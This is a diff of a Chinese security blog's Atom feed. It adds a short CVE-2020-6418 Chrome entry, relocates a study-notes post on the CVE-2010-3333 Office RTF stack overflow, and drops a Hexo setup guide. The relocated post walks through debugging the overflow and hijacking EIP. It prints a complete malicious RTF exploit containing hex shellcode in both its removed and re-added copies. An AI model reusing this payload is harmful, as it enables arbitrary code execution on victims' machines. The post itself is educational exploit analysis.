@@ -109,6 +109,29 @@
   </entry>
   
   <entry>
+    <title>CVE-2020-6418</title>
+    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2020-6418/"/>
+    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2020-6418/</id>
+    <published>2022-08-09T03:33:40.197Z</published>
+    <updated>2022-08-09T03:29:41.243Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>(资料来自绿盟科技)</p><p>2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418.</p><p>CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。</p><p>受影响产品版本：</p><p>Google Chrome Version&lt;80.0.3987.122</p><p>适用于windows,Mac,Linux.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.nsfocus.net/cve-2020-6418">http://blog.nsfocus.net/cve-2020-6418</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;(资料来自绿盟科技)&lt;/p&gt;
+&lt;p&gt;2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野</summary>
+      
+    
+    
+    
+    
+    <category term="chrome调试" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E8%B0%83%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
     <title>burp四种密码爆破模式学习</title>
     <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
     <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/</id>
@@ -182,28 +205,6 @@
   </entry>
   
   <entry>
-    <title>漏洞战争学习笔记2：CVE-2010-3333</title>
-    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/"/>
-    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/</id>
-    <published>2022-08-09T03:17:04.198Z</published>
-    <updated>2022-08-09T04:19:33.523Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h2><p>os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。</p><p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p><h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。</p><p>office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。</p><h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>用Metasploit生成测试样本msf.rtf。</p><p><img src="https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png" alt="生成msf.PNG"></p><p>运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p><p><img src="https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png" alt="裂开.PNG"></p><p>[待续]</p><p>打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。</p><ul><li>g</li><li>kb</li></ul><p>在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，<br>结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p><p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD</p><ul><li>p</li></ul><p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p><h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p><p>z<br>{\rtf1{}{\shp{*\shpinst{\sp{\sn pfragments}{\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}<br>```</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;0x01-分析环境&quot;&gt;&lt;a href=&quot;#0x01-分析环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 分析环境&quot;&gt;&lt;/a&gt;0x01 分析环境&lt;/h2&gt;&lt;p&gt;os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11</summary>
-      
-    
-    
-    
-    
-    <category term="漏洞战争" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"/>
-    
-  </entry>
-  
-  <entry>
     <title>各类型软件漏洞合集</title>
     <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/"/>
     <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</id>
@@ -222,6 +223,28 @@
     
     
     <category term="漏洞" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>漏洞战争学习笔记2：CVE-2010-3333</title>
+    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/"/>
+    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/</id>
+    <published>2022-08-09T03:17:04.198Z</published>
+    <updated>2022-08-09T04:19:33.523Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h2><p>os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。</p><p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p><h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。</p><p>office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。</p><h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>用Metasploit生成测试样本msf.rtf。</p><p><img src="https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png" alt="生成msf.PNG"></p><p>运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p><p><img src="https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png" alt="裂开.PNG"></p><p>[待续]</p><p>打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。</p><ul><li>g</li><li>kb</li></ul><p>在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，<br>结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p><p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD</p><ul><li>p</li></ul><p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p><h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p><p>z<br>{\rtf1{}{\shp{*\shpinst{\sp{\sn pfragments}{\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}<br>```</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;0x01-分析环境&quot;&gt;&lt;a href=&quot;#0x01-分析环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 分析环境&quot;&gt;&lt;/a&gt;0x01 分析环境&lt;/h2&gt;&lt;p&gt;os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11</summary>
+      
+    
+    
+    
+    
+    <category term="漏洞战争" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"/>
     
   </entry>
   
@@ -451,27 +474,6 @@
     
     
     <category term="IOT" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Win10下使用Hexo搭建个人博客</title>
-    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
-    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
-    <published>2022-08-07T08:48:45.000Z</published>
-    <updated>2022-08-09T07:56:51.516Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="下载安装git、nodejs"><a href="#下载安装git、nodejs" class="headerlink" title="下载安装git、nodejs"></a>下载安装git、nodejs</h2><p>下载地址: </p><p>git: <a href="https://git-scm.com/">https://git-scm.com/</a> </p><p>nodejs: <a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a></p><p>将nodejs加入path环境变量中。打开cmd测试：</p><p><img src="https://s2.loli.net/2022/08/07/NduraiRMcEQythF.png" alt="图片.png"></p><blockquote><p>报错1：输入 <code>npm-v</code> 出现报错:</p></blockquote><pre><code class="hljs">npm WARN config global --global, --local are deprecated. Use `–location</code></pre><p>解决方法：打开<code>nodejs</code>安装位置文件夹，打开<code>npm.cmd</code>和<code>npm</code>，将文件中的<code>prefix -g</code>替换为<code>prefix --location=global</code>,保存后重新打开cmd测试即可。</p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><h3 id="换源（淘宝源）"><a href="#换源（淘宝源）" class="headerlink" title="换源（淘宝源）"></a>换源（淘宝源）</h3><pre><code class="hljs">npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm -v </code></pre><p><img src="https://s2.loli.net/2022/08/07/9zM1KhnkOqAFsU6.png" alt="图片.png"></p><p>查看版本以及是否安装成功。</p><h3 id="安装hexo-1"><a href="#安装hexo-1" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code class="hljs">cnpm install -g hexo-clihexo -v</code></pre><p>新建文件夹放置博客内容，在cmd中进入所建立的目录：</p><pre><code class="hljs">hexo init #初始化hexohexo s #启动hexo</code></pre><p>访问 <code> http://localhost:4000/</code>如下即成功：</p><p><img src="https://s2.loli.net/2022/08/07/dvIiunG5yhOEUX8.png" alt="图片.png"></p><h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><pre><code class="hljs">hexo new "文章标题"</code></pre><p>在目录/source/_posts/下生成文件.md<br>更新文章：<br>    hexo clean<br>    hexo g<br>    hexo s</p><h2 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h2><p>1、建立一个新的库，命名需要符合规则：<code>username.gitgub.io</code><br>2、命令行输入：</p><pre><code class="hljs">cnpm install --save hexo-deployer-git  </code></pre><p>3、更改设置</p><p>找到_config.yml文件，翻到最底部</p><p>将<code>type</code>改为<code>git</code></p><p>添加<code>repo: "此处为仓库地址"</code></p><p>添加<code>branch: master</code></p><p>repo为仓库地址 branch为master即可</p><p><img src="https://s2.loli.net/2022/08/07/akWVI3mUinyP2sJ.png" alt="图片.png"></p><p>4、部署到远端</p><pre><code class="hljs">git config --global user.email "xxx(此处为邮箱)"  git config --global user.name "xxx(此处为用户名)"  #github用户名hexo d  </code></pre><p>弹出网页提示是否关联git和github 授权即可</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;下载安装git、nodejs&quot;&gt;&lt;a href=&quot;#下载安装git、nodejs&quot; class=&quot;headerlink&quot; title=&quot;下载安装git、nodejs&quot;&gt;&lt;/a&gt;下载安装git、nodejs&lt;/h2&gt;&lt;p&gt;下载地址: &lt;/p&gt;
-&lt;p&gt;git: &lt;a </summary>
-      
-    
-    
-    
     
   </entry>
   
